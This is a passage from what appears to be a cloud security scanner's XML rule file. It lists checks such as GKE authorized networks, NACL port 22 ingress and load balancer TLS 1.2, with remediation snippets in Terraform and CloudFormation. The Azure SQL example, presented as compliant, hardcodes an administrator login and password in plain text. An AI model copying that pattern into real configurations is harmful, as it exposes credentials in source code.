      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="master-authorized-networks-are-not-enabled-in-gke-clusters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-master-authorized-networks-are-not-enabled-in-gke-clusters"></div>Master authorized networks are not enabled in GKE clusters</div><a aria-label="Skip link to Master authorized networks are not enabled in GKE clusters" class="heading-anchor-icon fa fa-anchor" href="#master-authorized-networks-are-not-enabled-in-gke-clusters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Authorized networks allow whitelisting of specific CIDR ranges and permit IP addresses in those ranges to access the cluster master endpoint using HTTPS. GKE uses both TLS and authentication to secure access to the cluster master endpoint from the public Internet. This approach enables the flexibility to administer the cluster from anywhere. </p>
<p>We recommend you enable <strong>master authorized networks</strong> in GKE clusters. Using authorized networks you will be able further restrict access to specified sets of IP addresses.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_228</key>
    <name>Ensure AWS Elasticsearch domain uses an updated TLS policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-domain-does-not-use-an-updated-tls-policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-domain-does-not-use-an-updated-tls-policy"></div>AWS Elasticsearch domain does not use an updated TLS policy</div><a aria-label="Skip link to AWS Elasticsearch domain does not use an updated TLS policy" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-domain-does-not-use-an-updated-tls-policy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-domain-uses-an-updated-tls-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-domain-uses-an-updated-tls-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-domain-uses-an-updated-tls-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_232</key>
    <name>Ensure AWS NACL does not allow ingress from 0.0.0.0/0 to port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-nacl-allows-ingress-from-00000-to-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-nacl-allows-ingress-from-0-0-0-0-0-to-port-22"></div>AWS NACL allows ingress from 0.0.0.0/0 to port 22</div><a aria-label="Skip link to AWS NACL allows ingress from 0.0.0.0/0 to port 22" class="heading-anchor-icon fa fa-anchor" href="#aws-nacl-allows-ingress-from-00000-to-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Network Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:  
  InboundRule:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
       NetworkAclId:
         Ref: MyNACL
       RuleNumber: 200
       Protocol: 6
       RuleAction: allow
-      CidrBlock: 0.0.0.0/0
+      CidrBlock: 10.0.0.0/32
       PortRange:
         From: 22
         To: 22
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_network_acl_rule" "example" {
  network_acl_id = aws_network_acl.example.id
  rule_number    = 200
  egress         = false
  protocol       = "tcp"
  rule_action    = "allow"
- cidr_block     = "0.0.0.0/0"
+ cidr_block     = "10.0.0.0/32"
  from_port      = 22
  to_port        = 22
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-22' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_120</key>
    <name>Ensure AWS API Gateway caching is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-gateway-caching-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-gateway-caching-is-disabled"></div>AWS API Gateway caching is disabled</div><a aria-label="Skip link to AWS API Gateway caching is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-api-gateway-caching-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A cache cluster caches responses. With caching, you can reduce the number of calls made to your endpoint and also improve the latency of requests to your API.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>Go to the API Gateway console.</li>
<li>Select an API.</li>
<li>Select <strong>Stages</strong>.</li>
<li>In the <strong>Stages</strong> list for the API, select the required stage.</li>
<li>Go to the <strong>Settings</strong> tab.</li>
<li>Select <strong>Enable API cache</strong>.</li>
<li>Wait until cache creation is complete.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">resource "aws_api_gateway_rest_api" "example" {
...
  + cache_cluster_enabled = true
...
}
</code></pre>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Resources:
  Prod:
    Type: AWS::ApiGateway::Stage
    Properties:
      ...
      + CacheClusterEnabled: True
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-caching-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-caching-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-caching-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_198</key>
    <name>Ensure AWS RDS security groups are defined</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-security-groups-are-not-defined"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-security-groups-are-not-defined"></div>AWS RDS security groups are not defined</div><a aria-label="Skip link to AWS RDS security groups are not defined" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-security-groups-are-not-defined"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-security-groups-are-defined' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-rds-security-groups-are-defined</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-security-groups-are-defined' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_21</key>
    <name>Ensure GCP Kubernetes engine clusters have label information</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-do-not-have-any-label-information"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-do-not-have-any-label-information"></div>GCP Kubernetes engine clusters do not have any label information</div><a aria-label="Skip link to GCP Kubernetes engine clusters do not have any label information" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-do-not-have-any-label-information"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Labels are key, value pairs that are attached to objects intended to be used to specify identifying attributes of objects that are meaningful and relevant to users, but do not directly imply semantics to the core system. </p>
<p>Labels can be used to organize and select subsets of objects. Labels can be attached to objects at creation time and subsequently added and modified at any time. Each object can have a set of key/value labels defined. Each Key must be unique for a given object. Labels enable users to map their own organizational structures onto system objects in a loosely coupled fashion, without requiring clients to store these mappings.</p>
<p>We recommend you configure Kubernetes clusters with labels.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_13' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_22</key>
    <name>Ensure GCP Kubernetes engine clusters are using Container-Optimized OS for node image</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-are-not-using-container-optimized-os-for-node-image"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-are-not-using-container-optimized-os-for-node-image"></div>GCP Kubernetes engine clusters are not using Container-Optimized OS for node image</div><a aria-label="Skip link to GCP Kubernetes engine clusters are not using Container-Optimized OS for node image" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-are-not-using-container-optimized-os-for-node-image"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GKE enables users to select the operating system image that runs on each node. You can also upgrade an existing cluster to use a different node image type. GKE supports several OS images using the main container runtime directly integrated with Kubernetes, including <strong>cos_containerd</strong> and <strong>ubuntu_containerd</strong>. </p>
<p>We recommend you use <strong>cos_containerd</strong> and <strong>ubuntu_containerd</strong> to enhance node security. <strong>Containerd</strong> is an industry-standard container runtime component that regularly updates security fixes and patches, providing better support, security, and stability than other images. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcloud-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcloud-cli"></div>Gcloud CLI</div><a aria-label="Skip link to Gcloud CLI" class="heading-anchor-icon fa fa-anchor" href="#gcloud-cli"></a></h2>
<p>Use this following command to upgrade the cluster to use the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">COS</code> image:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">gcloud container clusters upgrade --image-type cos cluster-name 
</code></pre>
<p>To upgrade a specific node-pool add the flag/argument <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--node-pool node-pool-name</code>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Add the <strong>image_type</strong> argument into the <strong>node_config</strong> bloc to your <strong>google_container_cluster</strong> or <strong>google_container_node_pool</strong> resource:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">hcl
    node_config {
      image_type   = "COS"
  }
</code></pre>
<p>It should force the cluster to recreate a node following the new configuration.</p>
<p>For further information please follow this link: <a href="https://www.terraform.io/docs/providers/google/r/container_cluster.html#image_type" target="_self">https://www.terraform.io/docs/providers/google/r/container_cluster.html#image_type</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_14' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_14</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_14' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_103</key>
    <name>Ensure AWS Load Balancer is using TLS 1.2</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-load-balancer-is-not-using-tls-12"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-load-balancer-is-not-using-tls-1-2"></div>AWS Load Balancer is not using TLS 1.2</div><a aria-label="Skip link to AWS Load Balancer is not using TLS 1.2" class="heading-anchor-icon fa fa-anchor" href="#aws-load-balancer-is-not-using-tls-12"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A listener in an AWS Load Balancer is a process that checks for connection requests. Users can define a listener when creating a load balancer, and add listeners to the load balancer at any time. The HTTPS listener enables traffic encryption between your load balancer and the clients that initiate SSL or TLS sessions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Go to the Amazon EC2 console at <a href="https://console.aws.amazon.com/ec2/" target="_self">https://console.aws.amazon.com/ec2/</a>.</li>
<li>On the navigation pane, under LOAD BALANCING, select Load Balancers.</li>
<li>Select the load balancer and choose Listeners.<br/>
4.Select the check box for the TLS listener and choose Edit.</li>
<li>For Security policy, choose a security policy.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">modify-listener
--listener-arn &lt;value&gt;
[--port &lt;value&gt;]
[--protocol &lt;value&gt;]
[--ssl-policy &lt;value&gt;]
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p><em>Resource: aws_lb_listener<br/>
</em>Attribute: protocol - (Optional) The protocol for connections from clients to the load balancer. For Application Load Balancers, valid values are HTTP and HTTPS, with a default of HTTP. For Network Load Balancers, valid values are TCP, TLS, UDP, and TCP_UDP. Not valid to use UDP or TCP_UDP if dual-stack mode is enabled. Not valid for Gateway Load Balancers.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_db_parameter_group.custom.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_db_parameter_group.custom.tf">resource "aws_lb_listener" "front_end" {
  load_balancer_arn = aws_lb.front_end.arn
  port              = "443"
  protocol          = "HTTPS"
  + ssl_policy        = "ELBSecurityPolicy-TLS-1-2-2017-01"
  certificate_arn   = "arn:aws:acm:eu-west-2:999999999:certificate/77777777-5d4a-457f-8888-02550c8c9244"

  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.front_end.arn
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_43' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_43</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_43' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_13</key>
    <name>Ensure SQL servers enable data security policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sql-servers-do-not-enable-data-security-policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sql-servers-do-not-enable-data-security-policy"></div>SQL servers do not enable data security policy</div><a aria-label="Skip link to SQL servers do not enable data security policy" class="heading-anchor-icon fa fa-anchor" href="#sql-servers-do-not-enable-data-security-policy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender for SQL provides a new layer of security, which enables customers to detect and respond to potential threats as they occur by providing security alerts on anomalous activities. Users will receive an alert upon suspicious database activities, potential vulnerabilities, SQL injection attacks, as well as anomalous database access patterns. Advanced threat protection alerts provide details of suspicious activity and recommend action on how to investigate and mitigate the threat.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-cli"></div>In Azure CLI</div><a aria-label="Skip link to In Azure CLI" class="heading-anchor-icon fa fa-anchor" href="#in-azure-cli"></a></h2>
<ol>
<li>Log in to the Azure Portal.</li>
<li>Go to the reported SQL server</li>
<li>Select 'SQL servers', Click on the SQL server instance you wanted to modify</li>
<li>Click on 'Security Center' under 'Security'</li>
<li>Click on 'Enable Azure Defender for SQL'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_sql_server, azurerm_mssql_server_security_alert_policy</li>
<li><strong>Argument:</strong> server_name (of <em>azurerm_mssql_server_security_alert_policy</em> )</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_sql_server" "sql_server_good_1" {
  name                         = "mysqlserver"
  resource_group_name          = "group"
  location                     = "location"
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}

resource "azurerm_sql_server" "sql_server_good_2" {
  name                         = "mysqlserver"
  resource_group_name          = "group"
  location                     = "location"
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}


resource "azurerm_mssql_server_security_alert_policy" "alert_policy_good" {
  resource_group_name        = "group"
  server_name                = azurerm_sql_server.sql_server_good_1.name
  state                      = "Enabled"
  retention_days = 20
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-sql-servers-enables-data-security-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-sql-servers-enables-data-security-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-sql-servers-enables-data-security-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_23</key>
    <name>Ensure Kubernetes clusters are created with alias IP ranges enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-clusters-are-not-created-with-alias-ip-ranges-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-clusters-are-not-created-with-alias-ip-ranges-enabled"></div>Kubernetes clusters are not created with alias IP ranges enabled</div><a aria-label="Skip link to Kubernetes clusters are not created with alias IP ranges enabled" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-clusters-are-not-created-with-alias-ip-ranges-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GKE, clusters can be set apart based on how they route traffic from one pod to another. A cluster that uses alias IP ranges is called a VPC-native cluster. A cluster that uses Google Cloud Routes is called a routes-based cluster. </p>
<p>We recommend you create Kubernetes clusters with alias IP ranges enabled. Alias IP ranges allow Pods to directly access hosted services without using a NAT gateway.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_15' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_15</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_15' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_263</key>
    <name>Ensure AWS App Flow flow uses Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-app-flow-flow-does-not-use-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-flow-flow-does-not-use-customer-managed-keys-cm-ks"></div>AWS App Flow flow does not use Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS App Flow flow does not use Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-app-flow-flow-does-not-use-customer-managed-keys-cmks"></a></h1>
